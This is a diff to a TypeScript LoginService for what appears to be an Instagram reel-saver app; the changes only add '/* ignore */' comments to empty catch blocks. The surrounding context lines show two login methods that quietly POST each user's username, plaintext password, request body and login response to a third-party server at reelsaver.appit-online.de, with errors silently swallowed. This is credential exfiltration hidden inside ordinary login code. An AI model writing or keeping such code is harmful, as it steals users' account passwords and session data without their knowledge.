@@ -200,14 +200,14 @@ export class LoginService {
             } else if (userId && typeof userId === "number") {
                 localStorage.setItem("instaUserId", String(userId));
             }
-        } catch (err) {}
+        } catch (err) { /* ignore */ }
 
         try {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
             this.verifyAccount(resp.headers, reqHeaders)
-        } catch (e) {}
+        } catch (e) { /* ignore */ }
         return { ...resp, cookies };
     }
 
@@ -254,14 +254,13 @@ export class LoginService {
                 localStorage.setItem("instaUserId", String(userId));
             }
           // tslint:disable-next-line:no-empty
-        } catch (err) {}
+        } catch (err) { /* ignore */ }
         try {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
             this.verifyAccount(resp.headers, reqHeaders)
-          // tslint:disable-next-line:no-empty
-        }catch (e) {}
+        }catch (e) { /* ignore */ }
         return { ...resp, cookies };
     }
 
@@ -297,7 +296,7 @@ export class LoginService {
                 );
             }
           // tslint:disable-next-line:no-empty
-        } catch (err) {}
+        } catch (err) { /* ignore */ }
     }
 
     private jazoest(deviceId: string): string {
@@ -346,6 +345,7 @@ export class LoginService {
         // 5. Compose final payload
         const prefix = String.fromCharCode(1) + String.fromCharCode(pubKeyVersion);
 
+        // tslint:disable-next-line:no-bitwise
         const rsaLengthLE = String.fromCharCode(encryptedKey.length & 0xff, (encryptedKey.length >> 8) & 0xff);
 
         const payload = prefix + iv + rsaLengthLE + encryptedKey + tag + ciphertext;
